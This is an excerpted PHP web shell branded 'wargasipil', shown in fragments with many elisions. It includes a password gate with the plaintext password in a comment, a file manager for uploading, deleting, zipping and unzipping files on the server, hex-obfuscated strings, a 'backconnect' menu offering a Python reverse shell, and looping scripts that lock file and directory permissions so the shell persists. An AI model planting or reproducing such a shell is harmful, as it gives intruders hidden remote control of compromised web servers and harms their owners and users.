...
?>
    ...
    <body><center>
        ...
        <img src="https://e.top4top.io/p_3435h8gjs1.jpg" weight="512px" height="512px">
...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$10$CQbCuEjIdzh/Ekf6UbiKP.VthiObQR3WtFop9vgup9wAQ8BpVZSJe'; // wargasipil
...
<head>
    ...
    <title>wargasipil [ <?= $_SERVER['SERVER_NAME']; ?> ] Warga Sipil</title>
    ...
    <style>
        ...
        tbody tr:nth-child(2n) {
            background-color:rgba(34, 36, 45, 0)
        }
...
body {
  background-image: url('https://d.top4top.io/p_34353v8fe1.png');
  background-repeat: no-repeat;
  ...
  font-family: monospace;
        ...
        .path-pwd,
        thead {
            background-color:rgba(46, 49, 61, 0)
        }
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li class="logo-wargasipil"><img width="512" height="312" src="//k.top4top.io/p_34354k54r1.png" align="right"></li>
            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                <li class="form-upload"><input type="submit" value="Upload" name="wargasipil-up-submit" class="btn-submit">&nbsp;<input type="file" name="wargasipil-upload" class="form-file"></li>
            </form>
        </ul>
    </div>
    ...
    <div class="menu-file-manager">
        ...
        <table style="width: 100%;">
            ...
            <form action="" method="post">
                <tbody>
                    <!-- wargasipil Folder File Manager -->
                    <?php foreach ($file_manager as $_D) : ?>
                        ...
                        <?php endif; ?>
                    <?php endforeach; ?>
                    <!-- wargasipil Files Manager -->
                    <?php foreach ($file_manager as $_F) : ?>
                        <?php if ($fungsi[3]($_F)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="wargasipil-files"><?= namaPanjang($_F); ?></a></td>
        ...
        <br>
        <select name="wargasipil-select" class="btn-submit">
    ...
    <?php if (isset($_GET['backconnect'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                ...
                <form action="" method="post">
                    <div class="modal-body">
                        <select class="bc-wargasipil box-shadow" name="wargasipil-bc">
...
if (isset($_POST['submit-bc'])) {
    ...
    } else if ($_POST['wargasipil-bc'] == "python") {
...
while (True){
    ...
    if (wargasipil_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
    }
    if (wargasipil_perm("' . __DIR__ . '") != 0555){
        chmod("' . __DIR__ . '", 0555);
    }
}

function wargasipil_perm($flename){
...
if (isset($_POST['wargasipil-up-submit'])) {
    $namaFilenya = $_FILES['wargasipil-upload']['name'];
    $tmpName = $_FILES['wargasipil-upload']['tmp_name'];
...
if (isset($_POST['submit-action'])) {
    $items = $_POST['check'];
    if ($_POST['wargasipil-select'] == "delete") {
        foreach ($items as $it) {
    ...
    } else if ($_POST['wargasipil-select'] == 'unzip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
    ...
    } else if ($_POST['wargasipil-select'] == 'zip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if ($fungsi[3]($fd)) {
...
while (True){
    ...
    if (wargasipil_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    } 
    if (wargasipil_perm("' . $fungsi[0]() . '") != 0555){
        chmod("' . $fungsi[0]() . '", 0555);
    }
}
